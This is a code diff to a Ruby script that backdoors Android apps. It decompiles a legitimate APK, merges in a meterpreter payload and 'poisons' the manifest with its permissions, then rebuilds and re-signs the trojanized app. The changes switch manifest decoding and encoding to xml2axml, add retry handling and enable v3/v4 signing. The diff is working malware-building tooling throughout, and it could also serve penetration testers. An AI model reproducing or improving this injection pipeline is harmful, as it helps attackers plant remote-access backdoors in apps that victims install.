@@ -261,7 +261,7 @@ def gen_keystore(apkfile,keystore,storepass,keypass,keyalias)
 end
 
 def cleaning_up()
-  toClean = ["data","original","payload","original.apk","payload.apk","signing.keystore","payload.apk.idsig"]
+  toClean = ["data","original","payload","original.apk","payload.apk","signing.keystore","*.idsig"]
   for i in toClean do
     run_cmd(['rm', '-rf', i])
   end
@@ -353,13 +353,18 @@ end
 run_cmd(["cp", apkfile, "#{cwd}/original.apk"])
 print_status("Decompiling orignal APK..")
 run_cmd(["apktool", "d", "-f", "-r", "-o", "#{cwd}/original", "#{cwd}/original.apk"])
-print_status("Ignoring the resource decompilation..")
-run_cmd(["apktool", "d", "-f", "-o", "#{cwd}/original_tmp", "#{cwd}/original.apk"])
-FileUtils.rm_rf('original/apktool.yml')
-FileUtils.cp Dir.glob('original_tmp/apktool.yml'), 'original/'
-FileUtils.rm_rf('original/AndroidManifest.xml')
-FileUtils.cp Dir.glob('original_tmp/AndroidManifest.xml'), 'original/'
-FileUtils.rm_rf('original_tmp')
+print_status("Decompiling AndroidManifest..")
+FileUtils.cp Dir.glob("#{cwd}/original/AndroidManifest.xml"), "#{cwd}/"
+FileUtils.rm_rf("#{cwd}/original/AndroidManifest.xml")
+run_cmd(['xml2axml', 'd', "#{cwd}/AndroidManifest.xml", "#{cwd}/original/AndroidManifest.xml"])
+FileUtils.rm_rf("#{cwd}/AndroidManifest.xml")
+# print_status("Ignoring the resource decompilation..")
+# run_cmd(["apktool", "d", "-f", "-o", "#{cwd}/original_tmp", "#{cwd}/original.apk"])
+# FileUtils.rm_rf('original/apktool.yml')
+# FileUtils.cp Dir.glob('original_tmp/apktool.yml'), 'original/'
+# FileUtils.rm_rf('original/AndroidManifest.xml')
+# FileUtils.cp Dir.glob('original_tmp/AndroidManifest.xml'), 'original/'
+# FileUtils.rm_rf('original_tmp')
 print_status("Decompiling payload APK..")
 run_cmd(['apktool', 'd', '-f', '-o', "#{cwd}/payload", "#{cwd}/payload.apk"])
 
@@ -417,6 +422,22 @@ print_status("Poisoning the manifest with meterpreter permissions..")
 fix_manifest(minSDKv)
 
 print "\n"
+print_status("Encoding AndroidManifest file..")
+for i in (1..3) do
+  stdout, stderr, status = run_cmd(['xml2axml', 'e', "#{cwd}/original/AndroidManifest.xml", "#{cwd}/AndroidManifest.xml"])
+  xml2axml_output = stdout + stderr
+  FileUtils.rm_rf("#{cwd}/original/AndroidManifest.xml")
+  FileUtils.cp Dir.glob("#{cwd}/AndroidManifest.xml"), 'original/'
+  FileUtils.rm_rf("#{cwd}/AndroidManifest.xml")
+  if !status.success?
+    print_error(xml2axml_output)
+    cleaning_up()
+    raise RuntimeError, "Unable to encode AndroidManifest.. Retrying[#{i}].."
+  else 
+    break
+  end 
+end
+
 print_status("Rebuilding #{apkfile} with meterpreter injection as #{injected_apk}..")
 for i in (1..3) do
   stdout, stderr, status = run_cmd(['apktool', 'b', '-f', '-o', "#{cwd}/#{injected_apk}", "#{cwd}/original"])
@@ -455,7 +476,8 @@ end
 print_status("Signing #{final_apk} with apksigner..")
 stdout, stderr, status = run_cmd([
   'apksigner', 'sign', '--ks', keystore, '--ks-pass', "pass:#{storepass}", 
-  '--ks-key-alias', keyalias, '--min-sdk-version', "#{minSDKv}", final_apk
+  '--ks-key-alias', keyalias, '--v3-signing-enabled', 'true', '--v4-signing-enabled', 'true',
+  '--min-sdk-version', "#{minSDKv}", final_apk
 ])
 apksigner_output = stdout + stderr
 
